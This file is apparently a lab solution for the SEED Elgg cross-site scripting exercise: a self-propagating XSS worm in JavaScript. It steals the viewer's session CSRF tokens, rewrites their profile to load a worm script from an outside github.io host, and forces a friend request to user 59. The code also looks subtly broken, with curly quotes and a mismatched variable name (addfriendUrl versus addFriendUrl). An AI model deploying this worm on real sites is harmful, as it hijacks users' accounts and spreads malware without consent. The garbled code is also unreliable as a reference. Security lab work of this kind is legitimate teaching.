window.onload=function(){
var Ajax = null;
var Ajax2 = null;
var userName ="&name="+ elgg.session.user.name;
var guid="&guid="+ elgg.session.user.guid;
var ts=“&__elgg_ts="+ elgg.security.token.__elgg_ts;
var token ="&__elgg_token="+ elgg.security.token.__elgg_token;
var content = userName + guid + token + ts + "&description= <script type= \"text/javascript\" src=\"https://z-summer-zhw.github.io/lab1/xss_worm.js\"></script>";
var samyGuid =59;
var profileEditUrl="http://www.seed-server.com/action/profile/edit";
var addfriendUrl = "http://www.seed-server.com/action/friends/add?friend=59"+ ts + token;
if(elgg.session.user.guid != samyGuid){
Ajax = new XMLHttpRequest();
Ajax.open("POST",profileEditUrl,true);
Ajax.setRequestHeader("Content-Type",“application/x-www-form-urlencoded");
Ajax.send(content);
Ajax2 = new XMLHttpRequest();
Ajax2.open("GET",addFriendUrl,true);
Ajax2.send();
}
}

